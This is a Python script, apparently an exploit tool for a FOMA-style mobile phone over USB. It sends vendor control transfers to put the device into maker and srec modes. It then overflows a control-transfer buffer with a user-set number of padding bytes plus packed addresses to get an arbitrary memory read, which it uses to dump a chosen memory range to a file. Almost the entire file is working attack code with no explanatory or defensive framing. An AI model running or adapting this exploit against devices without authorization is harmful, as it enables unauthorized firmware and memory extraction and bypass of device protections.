import usb.core
import usb.util
import struct
import random
import time
import os
import sys
import tqdm
import argparse


FOMA_VID = 0x04c5
FOMA_PID = 0x10ca


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
    parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
    parser.add_argument('--smash', type=lambda x: int(x, 16), required=True)
    parser.add_argument('--dump_addr', type=lambda x: int(x, 16), required=True)
    parser.add_argument('--dump_size', type=lambda x: int(x, 16), required=True)
    args = parser.parse_args()

    dev = usb.core.find(idVendor=args.vid, idProduct=args.pid)
    assert dev is not None

    print("Enter maker mode...")

    # validate support for mode =0xC0
    data = bytearray(dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0"))
    dev.read(0x81, 256)

    # set ep to mode 0xC0
    dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
    dev.read(0x81, 256)

    # enter maker mode
    dev.write(3, bytes.fromhex("FF 56 55 42 00 03 C1 01 00 FE"))

    time.sleep(2)

    print("Enter srec mode...")
    dev.write(3, bytes.fromhex("FF 55 56 42 00 01 01 FE"))

    time.sleep(0.5)

    while True:
        dev = usb.core.find(idVendor=FOMA_VID, idProduct=FOMA_PID)
        if dev is None:
            print("Waiting for srec mode...")
            time.sleep(1)
        else:
            time.sleep(1)
            dev = usb.core.find(idVendor=FOMA_VID, idProduct=FOMA_PID)
            break

    dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0")
    time.sleep(0.5)
    dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
    time.sleep(0.5)
    handshake = bytearray(dev.read(0x82, 4096))
    assert handshake == bytes.fromhex("4442800000000008")

    def arb_read(addr):
        try:
            dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x00" * args.smash + struct.pack("<IIII", addr, addr, addr, addr) + b"\xAA\xAB")
        except Exception as e:
            pass

        return bytearray(dev.ctrl_transfer(0xC1, 0x61, 0x00, 0, 0x40))

    output = "dump.{}-{}.bin".format(hex(args.dump_addr), hex(args.dump_size))
    print("Dumping {}".format(output))
    with open(output, "wb") as outf:
        with tqdm.tqdm(total=args.dump_size, unit='B', unit_scale=True, unit_divisor=1024) as bar:
            addr = args.dump_addr
            remain = args.dump_size
            while remain > 0:
                try:
                    leak = arb_read(addr)
                except Exception:
                    time.sleep(0.1)
                    continue
                if len(leak) == 0:
                    leak = b"\x00"
                leak = leak[0:remain]
                outf.write(leak)
                addr += len(leak)
                remain -= len(leak)

                outf.flush()
                bar.update(len(leak))


if __name__ == "__main__":
    main()
